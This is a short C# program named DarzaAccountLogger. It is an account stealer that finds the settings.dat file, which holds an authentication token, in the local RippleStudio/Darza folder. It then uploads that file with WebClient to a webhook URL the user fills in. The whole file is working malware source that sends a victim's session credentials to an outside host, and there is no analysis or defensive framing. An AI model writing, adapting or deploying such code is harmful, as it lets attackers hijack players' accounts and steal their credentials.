using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net;

namespace DarzaAccountLogger
{
    class Program
    {
        static string webhook = "YOUR_WEBHOOK_HERE";
        static void Main(string[] args)
        {
            //gets settings.dat in Local/RippleStudio/Darza, which contains an encrypted authentication token
            var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "RippleStudio", "Darza");

            using (WebClient client = new WebClient())
            {
                client.UploadFile(webhook, Path.Combine(path, "settings.dat"));
            }
        }
    }
}
